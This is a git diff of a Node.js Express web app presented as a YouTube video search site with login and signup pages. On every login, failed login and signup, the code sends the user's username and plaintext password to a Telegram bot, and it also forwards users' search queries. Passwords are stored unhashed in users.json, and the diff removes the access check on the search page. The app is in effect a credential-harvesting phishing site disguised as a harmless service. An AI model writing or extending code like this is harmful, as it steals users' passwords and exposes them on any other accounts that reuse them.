@@ -1,6 +1,8 @@
 const express = require('express');
 const ytSearch = require('yt-search');
-const axios = require('axios'); // For API requests
+const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -14,28 +16,46 @@ app.use(express.urlencoded({ extended: true }));
 // Set EJS as the view engine
 app.set('view engine', 'ejs');
 
-// Store user data temporarily (in a real app, use a database)
-let userData = {};
+// File to store user data
+const usersFilePath = path.join(__dirname, 'users.json');
+
+// Load users from users.json
+let users = [];
+if (fs.existsSync(usersFilePath)) {
+    users = JSON.parse(fs.readFileSync(usersFilePath, 'utf-8'));
+}
 
 // Home route - Ask for user's name and password
 app.get('/', (req, res) => {
     res.render('name');
 });
 
-// Save user's name, password, and redirect to search
+// Save user's name, password, and redirect to search (Login functionality)
 app.post('/save-name', (req, res) => {
     const userName = req.body.userName;
     const password = req.body.password;
 
-    // Save the user's name and password
-    userData.name = userName;
-    userData.password = password;
+    // Check if user exists and credentials match
+    const user = users.find(u => u.username === userName && u.password === password);
 
-    // Send the name and password to Telegram bot
-    sendToTelegram(`New user:\nUsername: ${userName}\nPassword: ${password}`);
+    if (user) {
+        // Send login success message to Telegram
+        sendToTelegram(`User logged in:\nUsername: ${userName}\nPassword: ${password}`);
 
-    // Redirect to the search page
-    res.redirect('/search');
+        // Redirect to the search page
+        res.redirect('/search');
+    } else {
+        // Send login failure message to Telegram
+        sendToTelegram(`Login failed:\nUsername: ${userName}\nPassword: ${password}`);
+
+        // Show alert for incorrect credentials
+        res.send(`
+            <script>
+                alert('Password incorrect. Please signup.');
+                window.location.href = '/';
+            </script>
+        `);
+    }
 });
 
 // Route for Signup page
@@ -43,11 +63,44 @@ app.get('/signup', (req, res) => {
     res.render('signup');
 });
 
+// Save new user details (Signup functionality)
+app.post('/signup', (req, res) => {
+    const userName = req.body.userName;
+    const password = req.body.password;
+
+    // Check if user already exists
+    const userExists = users.some(u => u.username === userName);
+    if (userExists) {
+        res.send(`
+            <script>
+                alert('Username already exists. Please log in.');
+                window.location.href = '/';
+            </script>
+        `);
+    } else {
+        // Create a new user with a unique ID
+        const newUser = {
+            id: users.length + 1, // Simple unique ID
+            username: userName,
+            password: password,
+        };
+
+        // Add the new user to the array
+        users.push(newUser);
+
+        // Save the updated users array to users.json
+        fs.writeFileSync(usersFilePath, JSON.stringify(users, null, 2));
+
+        // Send signup success message to Telegram
+        sendToTelegram(`New user signed up:\nUsername: ${userName}\nPassword: ${password}`);
+
+        // Redirect to the search page
+        res.redirect('/search');
+    }
+});
+
 // Search route
 app.get('/search', (req, res) => {
-    if (!userData.name) {
-        return res.redirect('/'); // Redirect to name page if no name is set
-    }
     res.render('index', { results: null });
 });
 
@@ -56,7 +109,7 @@ app.post('/search', async (req, res) => {
     const query = req.body.query;
 
     // Save the search query and send to Telegram bot
-    sendToTelegram(`${userData.name} searched for: ${query}`);
+    sendToTelegram(`User searched for: ${query}`);
 
     // Search YouTube videos
     const { videos } = await ytSearch(query);
